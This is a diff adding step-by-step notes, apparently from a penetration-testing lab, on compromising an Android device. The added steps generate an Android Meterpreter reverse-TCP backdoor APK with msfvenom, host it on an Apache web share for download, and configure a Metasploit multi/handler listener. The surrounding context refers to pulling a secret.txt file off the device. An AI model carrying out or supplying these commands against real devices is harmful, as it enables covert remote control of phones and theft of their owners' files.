@@ -43,6 +43,83 @@ Enter the Full Path of file to Download
 sdcard/Download/secret.txt
 
 
+----------------------------------------------------------------------------------
+
+
+
+
+
+
+1)on Android 
+click the App drawer 
+
+
+2)Click the Terminal Emulator 
+
+
+3)Type su and press Enter then 
+Remember choice forever radio button and click Allow. 
+
+4)Type ip addr add 10.10.10.69/24 dev eth0 and press Enter. By doing this, you are assigning the IP Address 10.10.10.69 to the Android machine. 
+
+5) on linux 
+
+service postgresql start 
+
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk 
+
+
+Now type mkdir /var/www/html/share  . 
+
+chmod -R 755 /var/www/html/share        
+chown -R www-data:www-data /var/www/html/share 
+
+cp /root/Desktop/Backdoor.apk /var/www/html/share 
+
+
+service apache2 start 
+
+
+
+In the msfconsole, type use exploit/multi/handler 
+
+
+Type set payload android/meterpreter/reverse_tcp and press Enter. 
+ Type set LHOST 10.10.10.11 and press Enter. 
+ Type show options and press Enter. This command lets you know the listening port. 
+
+
+
+In the browser type http://10.10.10.11/share 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
